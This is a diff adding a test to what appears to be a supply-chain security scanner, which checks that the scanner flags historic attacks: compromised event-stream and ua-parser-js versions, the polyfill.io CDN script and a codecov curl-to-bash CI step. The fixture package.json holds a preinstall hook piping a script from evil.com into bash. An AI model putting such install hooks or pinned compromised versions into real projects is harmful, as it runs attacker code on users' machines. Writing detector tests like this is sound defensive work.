@@ -119,3 +119,61 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
     assert "tokio" in comp_names
     assert "serde" in comp_names
 
+
+def test_analyze_folder_detects_historic_attacks():
+    package_json = """{
+  "name": "vulnerable-historic-app",
+  "version": "1.0.0",
+  "dependencies": {
+    "event-stream": "3.3.6",
+    "ua-parser-js": "0.7.29"
+  },
+  "scripts": {
+    "preinstall": "curl -s http://evil.com/setup.sh | bash"
+  }
+}"""
+    html_file = """<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>
+</head>
+<body>Polyfill Test</body>
+</html>"""
+    ci_yml = """name: CI
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Upload coverage
+        run: curl -s https://codecov.io/bash | bash
+"""
+    payload = {
+        "project_name": "Historic Attack Target Repo",
+        "files": [
+            {"path": "package.json", "content": package_json},
+            {"path": "index.html", "content": html_file},
+            {"path": ".github/workflows/ci.yml", "content": ci_yml}
+        ],
+        "enable_code_review": True
+    }
+    response = client.post("/api/v1/analyze/folder", json=payload)
+    assert response.status_code == 200
+    data = response.json()
+    assert data["scan"]["status"] == "completed"
+    
+    # Check detector breakdown
+    breakdown = data.get("detector_breakdown", {})
+    assert breakdown.get("historic_attack_count", 0) >= 3
+    
+    # Check that findings contain historic attack markers
+    findings = data["findings"]
+    historic_findings = [f for f in findings if f.get("metadata", {}).get("is_historic_attack")]
+    assert len(historic_findings) >= 3
+    
+    titles = [f["title"] for f in historic_findings]
+    assert any("event-stream" in t for t in titles)
+    assert any("ua-parser-js" in t or "Lifecycle" in t for t in titles)
+    assert any("Polyfill" in t for t in titles)
+
+
